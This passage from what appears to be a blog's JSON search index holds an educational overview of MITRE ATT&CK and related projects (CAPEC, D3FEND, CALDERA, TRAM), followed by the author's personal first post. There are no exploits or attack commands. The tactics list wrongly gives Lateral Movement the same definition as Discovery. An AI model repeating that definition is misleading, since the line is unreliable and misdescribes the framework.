field of application, the main ones being Enterprise and Mobile.The official full name of the project is MITRE ATT&amp;amp;CK®, including the registered trademark that you should use in an official product that mentions it.MatricesThe matrices are a way to scope the knowledge base hierarchically depending on the field of application: Enterprise PRE (preparatory techniques) Windows MacOS Linux Cloud Office 365 Azure AD (Active Directory) Google Workspace SaaS (cloud managed services) IaaS Infrastructure as a Service(classic cloud provider infrastructure) Network Containers Mobile Android iOS ICS (industrial control systems) If are interested mostly in cloud-native security (containers, Kubernetes, and cloud), you should focus on containers and IaaS matrices, followed closely by Linux, Cloud SaaS, and Networking. The latest matrices to be added have been Cloud and Containers in 2021, but the list keeps growing.When you access one of the specialized matrices, you will see in it only the tactics and techniques that are relevant to the platform, but when you click on any of them you will see the same generic information with all data relevant to all platforms unfiltered.TacticsTactics are the first level of classification for adversarial activities. They do not contain adversarial information directly, they only serve as sets to group techniques that are the ones that do contain it.The list of all possible available tactics on any of the matrices is: Reconnaissance: The adversary is trying to gather information they can use to plan future operations. Resource Development: The adversary is trying to establish resources they can use to support operations. Initial Access: The adversary is trying to get into your network. Execution: The adversary is trying to run malicious code. Persistence: The adversary is trying to maintain their foothold. Privilege Escalation: The adversary is trying to gain higher-level permissions. Defense Evasion: The adversary is trying to avoid being detected. Credential Access: The adversary is trying to steal account names and passwords. Discovery: The adversary is trying to figure out your environment. Lateral Movement: The adversary is trying to figure out your environment. Collection: The adversary is trying to gather data of interest to their goal. Command and Control: The adversary is trying to communicate with compromised systems to control them. Exfiltration: The adversary is trying to steal data. Impact: The adversary is trying to manipulate, interrupt, or destroy your systems and data. Understanding this list of tactics, what each one means and the difference between each other is the most direct value you are going to take from ATT&amp;amp;CK. Go ahead and visit each one of their links to read their definitions.Only relevant tactics and techniques are included on each matrix, so they may not show in their representation on ATT&amp;amp;CK website.TechniquesTactics contain several techniques and subtechniques, that is the categorization level that holds direct information of related adversarial behaviors.When browsing a matrix on ATT&amp;amp;CK website, once you visit the link on a specific technique, you will be taken to the general description for the technique that is common to any of the matrices, and the procedures and mitigations listed will not be specific to the matrix you were browsing. Also, some techniques are featured in more than one tactic (it is an n:m mapping).The full list of techniques is too varied to list here. Visit the MITRE ATT&amp;amp;CK website and browse the full catalog for that. Let’s take a look here at an example of one of the techniques to see the kind of information we can find there.Exploitation for Privilege EscalationThe Exploitation for Privilege Escalation technique is described in ATT&amp;amp;CK as: Adversaries may exploit software vulnerabilities in an attempt to elevate privileges. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Security constructs such as permission levels will often hinder access to information and use of certain techniques, so adversaries will likely need to perform privilege escalation to include use of software exploitation to circumvent those restrictions.It includes descriptions for 26 procedures examples, including: G0080 : Cobalt Group has used exploits to increase their levels of rights and privileges.[10] S0154 : Cobalt Strike can exploit vulnerabilities such as MS14-058. [11] [12] S0601 : Hildegard has used the BOtB tool which exploits CVE-2019-5736.[18] S0654 : ProLock can use CVE-2019-0859 to escalate privileges on a compromised host.[23] S0603 : Stuxnet used MS10-073 and an undisclosed Task Scheduler vulnerability to escalate privileges on local Windows machines.[26]As you can see, the procedures mention Groups (G) as well as Software (S). Although links to the CVEs (Common Vulnerabilities and Exposures) are not provided, you can check them on its website also from MITRE. The numbered links take you to original publications from independent published research from renowned organizations and security companies, where each one of the procedures has been explained in detail for the first time.One of the 5 mitigations described in this technique is: M1048 Application Isolation and Sandboxing: Make it difficult for adversaries to advance their operation through exploitation of undiscovered or unpatched vulnerabilities by using sandboxing. Other types of virtualization and application microsegmentation may also mitigate the impact of some types of exploitation. Risks of additional exploits and weaknesses in these systems may still exist. [33]And the single detection mechanism listed is: DS0027 Driver: Driver LoadWith more information about difficulties and behaviors to take into consideration for detections.ATT&amp;amp;CK NavigatorMITRE ATT&amp;amp;CK Navigator is an open-source webapp that you can use online or run locally, to provide basic navigation and annotation of ATT&amp;amp;CK matrices, similar to what you could do manually exporting the original matrices to Excel.It makes it easy to define your own layer to highlight and filter some of the tactics and techniques defined in ATT&amp;amp;CK, maybe to represent techniques involved in an attack, or covered by a security tool.Screenshot of the MITRE ATT&amp;amp;CK Navigator with a layer showing all tactics and techniquesYou can export or import the layers’ data in JSON format.CAPECThe Common Attack Pattern Enumeration and Classification (CAPEC) is as they state: A comprehensive dictionary of known patterns of attack employed by adversaries to exploit known weaknesses in cyber-enabled capabilities.It has many things in common with ATT&amp;amp;CK but compiled from a different angle. In my opinion, it has more data that is more structured and with better references, but that is more difficult to navigate to learn from it “by hand” unfiltered. In my work on cybersecurity, I see ATT&amp;amp;CK referenced many times (sometimes as a synonym for MITRE itself in the cybersecurity world), but I’ve never seen CAPEC referenced. See their article on the main differences between here.Diagram of the relation between CWE, CAPEC, and CVERead an example of CAPEC information for SQL injection here.MITRE D3FENDMITRE D3FEND is a knowledge graph of cybersecurity countermeasures. While ATT&amp;amp;CK shows tactics, techniques, and procedures for adversary actions, D3FEND shows corresponding countermeasures.Screenshot of MITRE D3FEND technique treeIt was published in 2021 and still has to pass some time for security tools to use if, but it should be useful to map what is the real protective coverage of the tools you are using, and in which areas you may want to look for additional ones.Diagram showing digital artifact ontology relation between offensive and defensive modelsExpect soon an article from me telling more about MITRE D3FEND.Other projects and toolsIn addition to ATT&amp;amp;CK matrices, MITRE provides several other related projects and knowledge bases related to cybersecurity.Adversary Emulation LibraryThe Adversary Emulation Library is a compilation of plans that adversaries may take on an organization based on the real-world threats they face. Emulation plans are an essential component in testing current defenses for organizations that are looking to prioritize their defenses around actual adversary behavior.They are designed to empower red teams to manually emulate a specific threat actor to test and evaluate defensive capabilities from a threat-informed perspective. Rather than focusing on static signatures, these intelligence-driven emulation plans provide a repeatable means to test and tune defensive capabilities and products against the evolving Tactics, Techniques, and Procedures (TTPs) of threat actors and malware.Learn more on this blog post from MITRECALDERACALDERA is a cybersecurity platform designed to easily automate adversary emulation, assist manual red-teams, and automate incident response, using the Adversary Emulation Library and built on top of the MITRE ATT&amp;amp;CK framework.It is not a simple tool, and you will need specialized training to obtain the best out of it. Read more about it on its documentation website.Threat Report ATT&amp;amp;CK MappingThreat Report ATT&amp;amp;CK Mapping (TRAM) is an open-source platform designed to automate the mapping of cyber threat intelligence reports to MITRE ATT&amp;amp;CK.Using Machine Learning, you can train a model to read threat intelligence reports. The results can be generated in a JSON format that can be imported into ATT&amp;amp;CK Navigator for visualization.ATT&amp;amp;CK and CAPEC STIX DataStructured Threat Information Expression (STIX) is a language and serialization format used to exchange Cyber Threat Intelligence (CTI). There are two repositories that stores data for ATT&amp;amp;CK and CAPEC in STIX format: github.com/mitre-attack/attack-stix-data : repository contains the MITRE ATT&amp;amp;CK dataset represented in STIX 2.1 JSON collections. github.com/mitre/cti : MITRE ATT&amp;amp;CK and CAPEC datasets expressed in STIX 2.0. ConclusionThe MITRE Corporation is an important source of diverse cybersecurity information. The MITRE ATT&amp;amp;CK framework contains descriptions of Tactics, Techniques, and Procedures that help categorize and research security threats.If there is some information I missed in this article, or you just want to chat with me, let me know.And if you found this information extremely useful to you, why not let others know? Share it in a tweet, or invite me to coffee!Vicente Herrera is a software engineer working on cloud native cybersecurity (cloud, containers, Kubernetes).His latest job is cybersecurity specialist at Control Plane, and previously was Product Manager at Sysdig.He is the published author of Building Intelligent Cloud Application (O’Reilly, 2019) about using serverless and machine learning services with Azure.He has been involved in several research projects for using AI on healthcare and automatic code generation." }, { "title": "Hi everybody... welcome to my blog!", "url": "/blog/first-post/", "categories": "Personal", "tags": "test, personal", "date": "2021-11-13 00:00:00 +0100", "snippet": "It was about time for me to really have a blog. Or should I say Vlog?It’s not the first one I had. I tried many years ago to have something where several people could write. I also did a small test before a course on blogging with WordPress where I wrote an entry each day, and it was a very interesting experience. That got lost, and it didn’t have anything of special interest, I have to say. The thing is I like writting, I’ve been writting several things for work in the past, for leisure when I was very young, and I wish I would have continued to do so. I also like to read, and again, did read a lot of books before… before the Internet.I don’t think a lot of people is going to be reading this right now, but if you are, you may have some questions. Why now? Is this really going to last? Would I care for Vicente’s content? Why in English?Let’s start with the last one. I like writing in Spanish and English. Doing the latter is not easy (not my mother tongue), so doing this will be an interesting exercise. I know many friends will not read my posts if they are in English, but again I don’t think they will read this for long anyway. And I also plan to write about experiments I sometimes do and want to keep doing, about cybersecurity, science, IoT, science fiction, and some things I want to have a greater reach. I don’t mind few people reading this, but I want to write in a global way. And, I’m writing another thing in Spanish already… but spoilers, I can’t tell you about it yet.Would you care about this? Default answer is that I don’t think so. There you have it. But, you are already reading this, so you must have your own reasons. I hope to have something interesting for you to read. If not, tell me so. Anyway I’m not here just to entertain everybody, but I wish I could share information that has some interest for some people.To that point, I’m adding this kind of block format for any technical article I’m writting. I’m not interested in telling people just the same they could read on any specialized web page (and I don’t think I’ll do it better). You are here to also know about what I think about those topics.I plan this to last, lately I’ve been writing more for work, and longing to continue to do so just for myself. I have the ability, the ideas, the means… I just needed something to kickstart it. And for me, the pandemic has been it. I’ve been working before it started remote with high intensity, and after a couple of years I need to go out more, see more friends, and write more things. And I don’t plan that to be just a phase.You made to the end of the fist post! Now go read one of the other ones.You can also read my tweets.And if you like any of the articles here, please remember to share it in a tweet, or invite me to coffee if you want!Vicente Herrera is a software engineer working on cloud native cybersecurity (cloud, containers, Kubernetes).His latest job is cybersecurity specialist at Control Plane, and previously was Product Manager at Sysdig.He is the published author of Building Intelligent Cloud Application (O’Reilly, 2019) about using serverless and machine learning services with Azure.He has been involved in several research projects for using AI on healthcare and automatic code generation." } ]
